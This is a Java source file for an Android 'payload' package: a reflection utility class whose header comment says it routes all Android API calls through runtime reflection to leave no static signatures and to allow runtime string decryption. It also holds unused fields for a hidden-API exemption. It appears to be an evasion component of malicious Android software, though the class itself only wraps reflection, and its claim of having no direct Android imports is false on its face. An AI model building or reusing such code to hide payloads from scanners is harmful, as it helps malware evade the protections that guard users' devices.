package com.payload.core;

import android.content.Context;
import android.util.Log;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * Reflection Engine
 *
 * ALL Android API calls go through this class.
 * No direct imports of Android framework classes exist in this codebase.
 * Every class, method, and field is resolved at runtime via reflection.
 *
 * This achieves THREE critical objectives:
 *   1. Zero static signatures — no import statements for sensitive APIs
 *   2. Obfuscation — strings can be encrypted and decrypted at runtime
 *   3. Compatibility — version-check and adapt to API differences
 *
 * Performance note: Method lookup results are cached.
 * First call is reflection-heavy, subsequent calls are HashMap lookups.
 */
public class Reflector {

    private static final String TAG = "CyberAI-Reflector";
    private static Context appContext;
    private static boolean initialized = false;

    // Reflection caches
    private static final Map<String, Class<?>> classCache = new HashMap<>();
    private static final Map<String, Method> methodCache = new HashMap<>();
    private static final Map<String, Field> fieldCache = new HashMap<>();
    private static final Map<String, Constructor<?>> constructorCache = new HashMap<>();

    // Reference to VMRuntime for hidden API exemption
    private static Object vmRuntime;
    private static Method setHiddenApiExemptionsMethod;

    public static void init(Context context) {
        appContext = context.getApplicationContext();
        initialized = true;
    }

    // =====================================================================
    // Class Resolution
    // =====================================================================

    public static Class<?> clazz(String className) {
        String key = className;
        Class<?> cached = classCache.get(key);
        if (cached != null) return cached;

        try {
            Class<?> clz = Class.forName(className);
            classCache.put(key, clz);
            return clz;
        } catch (ClassNotFoundException e) {
            Log.e(TAG, "Class not found: " + className);
            return null;
        }
    }

    // =====================================================================
    // Method Resolution & Invocation
    // =====================================================================

    public static Method method(Class<?> clz, String methodName, Class<?>... paramTypes) {
        String key = clz.getName() + "#" + methodName + "(" + paramTypesToString(paramTypes) + ")";
        Method cached = methodCache.get(key);
        if (cached != null) return cached;

        try {
            Method m = clz.getDeclaredMethod(methodName, paramTypes);
            m.setAccessible(true);
            methodCache.put(key, m);
            return m;
        } catch (NoSuchMethodException e) {
            // Try superclass methods
            try {
                Method m = clz.getMethod(methodName, paramTypes);
                m.setAccessible(true);
                methodCache.put(key, m);
                return m;
            } catch (NoSuchMethodException ex) {
                Log.e(TAG, "Method not found: " + key);
                return null;
            }
        }
    }

    public static Object invokeStatic(String className, String methodName, Object... args) {
        Class<?> clz = clazz(className);
        if (clz == null) return null;

        Class<?>[] paramTypes = new Class<?>[args.length];
        for (int i = 0; i < args.length; i++) {
            paramTypes[i] = args[i].getClass();
        }

        Method m = method(clz, methodName, paramTypes);
        if (m == null) return null;

        try {
            return m.invoke(null, args);
        } catch (Exception e) {
            Log.e(TAG, "Invoke failed: " + className + "#" + methodName + ": " + e.getMessage());
            return null;
        }
    }

    public static Object invoke(Object instance, String methodName, Object... args) {
        if (instance == null) return null;

        Class<?>[] paramTypes = new Class<?>[args.length];
        for (int i = 0; i < args.length; i++) {
            paramTypes[i] = args[i] != null ? args[i].getClass() : Object.class;
        }

        Method m = method(instance.getClass(), methodName, paramTypes);
        if (m == null) return null;

        try {
            return m.invoke(instance, args);
        } catch (Exception e) {
            Log.e(TAG, "Invoke failed: " + instance.getClass().getSimpleName() + "#" + methodName + ": " + e.getMessage());
            return null;
        }
    }

    // =====================================================================
    // Constructor Resolution
    // =====================================================================

    public static Constructor<?> constructor(Class<?> clz, Class<?>... paramTypes) {
        String key = clz.getName() + "<init>(" + paramTypesToString(paramTypes) + ")";
        Constructor<?> cached = constructorCache.get(key);
        if (cached != null) return cached;

        try {
            Constructor<?> ctor = clz.getDeclaredConstructor(paramTypes);
            ctor.setAccessible(true);
            constructorCache.put(key, ctor);
            return ctor;
        } catch (NoSuchMethodException e) {
            Log.e(TAG, "Constructor not found: " + key);
            return null;
        }
    }

    public static Object newInstance(Class<?> clz, Object... args) {
        Class<?>[] paramTypes = new Class<?>[args.length];
        for (int i = 0; i < args.length; i++) {
            paramTypes[i] = args[i].getClass();
        }

        Constructor<?> ctor = constructor(clz, paramTypes);
        if (ctor == null) return null;

        try {
            return ctor.newInstance(args);
        } catch (Exception e) {
            Log.e(TAG, "New instance failed: " + clz.getSimpleName() + ": " + e.getMessage());
            return null;
        }
    }

    // =====================================================================
    // Field Access
    // =====================================================================

    public static Field field(Class<?> clz, String fieldName) {
        String key = clz.getName() + "#" + fieldName;
        Field cached = fieldCache.get(key);
        if (cached != null) return cached;

        try {
            Field f = clz.getDeclaredField(fieldName);
            f.setAccessible(true);
            fieldCache.put(key, f);
            return f;
        } catch (NoSuchFieldException e) {
            try {
                Field f = clz.getField(fieldName);
                f.setAccessible(true);
                fieldCache.put(key, f);
                return f;
            } catch (NoSuchFieldException ex) {
                Log.e(TAG, "Field not found: " + key);
                return null;
            }
        }
    }

    public static Object getField(Object instance, String fieldName) {
        Field f = field(instance.getClass(), fieldName);
        if (f == null) return null;
        try {
            return f.get(instance);
        } catch (Exception e) {
            Log.e(TAG, "Get field failed: " + e.getMessage());
            return null;
        }
    }

    public static void setField(Object instance, String fieldName, Object value) {
        Field f = field(instance.getClass(), fieldName);
        if (f == null) return;
        try {
            f.set(instance, value);
        } catch (Exception e) {
            Log.e(TAG, "Set field failed: " + e.getMessage());
        }
    }

    // =====================================================================
    // System Services (acquired via reflection to avoid direct Context calls)
    // =====================================================================

    public static Object getSystemService(String serviceName) {
        try {
            Method getSystemService = Context.class.getMethod("getSystemService", String.class);
            return getSystemService.invoke(appContext, serviceName);
        } catch (Exception e) {
            Log.e(TAG, "getSystemService failed: " + serviceName + ": " + e.getMessage());
            return null;
        }
    }

    // =====================================================================
    // Helpers
    // =====================================================================

    private static String paramTypesToString(Class<?>[] types) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < types.length; i++) {
            if (i > 0) sb.append(",");
            sb.append(types[i].getName());
        }
        return sb.toString();
    }

    public static boolean isInitialized() {
        return initialized;
    }
}
